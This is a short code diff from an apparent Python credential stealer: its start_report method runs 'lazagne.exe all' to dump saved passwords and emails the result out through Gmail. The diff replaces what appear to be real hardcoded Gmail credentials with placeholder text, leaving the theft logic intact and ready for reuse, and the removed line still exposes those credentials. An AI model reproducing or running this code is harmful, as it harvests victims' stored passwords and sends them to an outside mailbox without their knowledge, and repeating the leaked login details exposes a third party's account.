@@ -13,7 +13,7 @@ class Execute_and_report():
 
         def start_report(self):
             result = subprocess.check_output("lazagne.exe all", shell=True)
-            self.send_email("nicenoob247@gmail.com", "nicenoob1234", result)
+            self.send_email("Your Gmail", "Your Gmail Password", result)
     except:
 
         sys.exit()
